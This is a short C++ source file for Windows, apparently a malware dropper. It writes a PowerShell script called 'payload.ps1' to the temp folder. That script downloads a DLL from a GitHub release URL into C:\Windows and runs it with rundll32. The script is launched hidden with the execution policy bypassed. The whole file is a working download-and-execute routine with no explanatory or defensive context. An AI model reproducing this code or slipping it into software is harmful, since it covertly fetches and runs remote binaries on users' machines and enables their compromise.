#include <Windows.h>
#include <fstream>

bool WriteAndExecutePowerShellScript() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    std::wstring filePath = std::wstring(tempPath) + L"payload.ps1";
    std::wofstream psFile(filePath);
    if (!psFile.is_open()) return false;

    psFile << L"$dllFinalPath = 'C:\\Windows\\example_win32_directx9.dll'\n";
    psFile << L"$uri = 'https://github.com/lokeshx2008/EXE123/releases/download/EXE/example_win32_directx9.dll'\n";
    psFile << L"Invoke-WebRequest -Uri $uri -OutFile $dllFinalPath\n";
    psFile << L"Start-Process 'rundll32.exe' -ArgumentList \"$dllFinalPath,EntryPoint\"\n";

    psFile.close();

    ShellExecuteW(NULL, L"open", L"powershell.exe", (L"-ExecutionPolicy Bypass -File \"" + filePath + L"\"").c_str(), NULL, SW_HIDE);
    return true;
}
